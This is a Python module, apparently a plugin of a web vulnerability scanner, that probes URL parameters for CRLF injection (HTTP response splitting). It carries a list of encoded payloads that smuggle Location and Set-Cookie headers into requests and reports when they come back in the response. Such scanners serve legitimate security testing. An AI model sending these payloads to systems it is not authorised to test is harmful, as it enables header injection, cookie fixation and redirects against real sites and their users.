from yarl import URL
from core.features import requesterFunc,requests,multitest
from plugins.banner import *

redirectResponseCode = [i for i in range(300,311,1)]
errorResponseCode = [error for error in range(400, 411, 1)]

payloads = [
            r"%0d%0aLocation:www.google.com%0d%0a",
            r"%0d%0aSet-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;",
            r"%E5%98%8A%E5%98%8DLocation:www.google.com",
            r"\rSet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\rSet-Cookie:name=ch33ms;",
            r"%u000ASet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"%23%0D%0ALocation:www.google.com;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;",
            r"%5cr%5cnLocation:www.google.com",
            r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
            r"\rSet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;"
            ]

def crlfScanFunc(url,foxy):
    global payloadIndexCounter
    payloadIndexCounter = 0

    paramUrlTuple = multitest(url,payloads)
    if type(paramUrlTuple) is tuple:
        for params in paramUrlTuple[0]:
            testingBreak = request(paramUrlTuple[1],foxy,params)
            payloadIndexCounter = payloadIndexCounter + 1
            if testingBreak:
                break
    else:
        for url in paramUrlTuple:
            testingBreak = request(url,foxy)
            payloadIndexCounter = payloadIndexCounter + 1
            if testingBreak:
                break

def request(URI,foxy,params=''):
    try:
        responseObject = requesterFunc(URI,foxy,params)
    except requests.exceptions.Timeout:
        print(f"{bold}{blue}Timeout {orange} {URL}")
        return True
    except requests.exceptions.ConnectionError:
        print(f"{bold}{red}Connection Error{reset}")
        return True
    basicsCheckFunc(responseObject,responseObject.request.url)

def basicsCheckFunc(responseObject,url):
    googles = ["https://www.google.com", "http://www.google.com", "google.com", "www.google.com"] 

    if responseObject.headers.get('Location') in googles or responseObject.headers.get('Set-Cookie') == "name=ch33ms;":
        print(f"{bold}{green}HTTP Response Splitting found{reset}")
        print(f"{orange}{bold}Payload : {payloads[payloadIndexCounter]}")

    elif responseObject.status_code in errorResponseCode:
        print(f"{bold}{blue}{responseObject.status_code}{reset}")

    else:
        print(f"{bold}{red}Nothing Found : {url}")